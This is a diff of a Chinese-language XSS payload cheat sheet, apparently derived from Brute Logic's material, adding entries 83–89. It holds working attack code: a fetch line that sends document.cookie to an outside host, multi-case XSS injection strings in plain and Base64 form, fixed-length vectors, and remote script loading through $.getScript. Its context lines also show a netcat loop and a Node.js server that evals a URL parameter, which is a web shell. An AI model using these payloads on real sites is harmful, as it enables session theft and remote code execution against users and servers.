@@ -631,10 +631,51 @@ $ while :; do printf "j$ "; read c; echo $c | nc -lp 5855 >/dev/null; done
 require('http').createServer(function(req,res){res.end(1-
 eval(require('url').parse(req.url,1).query.cmd))}).listen(5855)
 ```
-**83.窃取cookie信息**
-用于从目标站点设置的受害者用户获取所有cookie。如果无法通过httpOnly安全标志。则在URL中将"+"编码为"%2B"
+**83.Cookie Stealing (窃取cookie信息)** <br>
+用于从目标站点设置的受害者用户获取所有cookie。如果无法通过httpOnly安全标志。则在URL中将"+"编码为"%2B" <br>
 ```
 fetch('//brutelogic.com.br/?c='+document.cookie)
+```
+**84.XSS Online Test Page (XSS在线测试页面)** <br>
+以下地址用于练习XSS向量和有效载荷。检查注入点的源代码。 <br>
+```
+https://brutelogic.com.br/xss.php
+```
+**85.HTML Entities Table (HTML实体表)** <br>
+用于HTML编码字符。
+```
+https://brutelogic.com.br/utils/charref.htm
+```
+**85.Multi-Case HTML Injection (多案例HTML注入)** <br>
+以下payload可作为一次测试机会，它有更高的成功XSS率。它适用于HTML上下文的所有情况（参见基础部分），包括带有标记注入的JS上下文。<br>
+```
+</Script/"'--><Body /Autofocus /OnFocus = confirm`1` <!-->
+```
+**86.Multi-Case HTML Injection - Base64 (多案例HTML注入-Base64)** <br>
+以下payload,在Base64编码以后中作为一次测试机会,可获得更高的XSS成功率。它适用于HTML上下文的所有情况（参见基础部分），包括带有标记注入的JS上下文。<br>
+```
+PC9TY3JpcHQvIictLT48Qm9keSAvQXV0b2ZvY3VzIC9PbkZvY3VzID0gY29uZmlybWAxYC
+A8IS0tPg==
+```
+**87.Vectors for Fixed Input Length (固定输入长度的payload)** <br>
+以下payload在输入必须具有固定长度时使用 <br>
+```
+MD5    12345678901 <svg/onload=alert(1)>
+SHA1   1234567890123456789 <svg/onload=alert(1)>
+SHA256 1234567890123456789012345678901234567890123 <svg/onload=alert(1)>
+
+```
+**88.PHP Sanitizing for XSS (PHP xss过滤)** <br>
+以下代码只用于阻止每个上下文中的xss，只要输入不返回在非分隔字符串、反勾号中间或任何其他类似于eval的函数（JS上下文中的所有函数）中。但是它不防止基于DOM的XSS，只防止基于源代码的XSS。<br>
+```
+$input = preg_replace("/:|\\\/", "", htmlentities($input, ENT_QUOTES))
+```
+
+**89.JavaScript Execution Delay (javascript执行延迟)** <br>
+以下payload基于JQuery的外部调用为例,当javascript库或任何其他需要注入的资源,在payload的执行中未完全加载时使用。 <br>
+```
+onload=function(){$.getScript('//brutelogic.com.br/2.js')}
+onload=x=>$.getScript('//brutelogic.com.br/2.js')
 ```
 
 ## 致谢
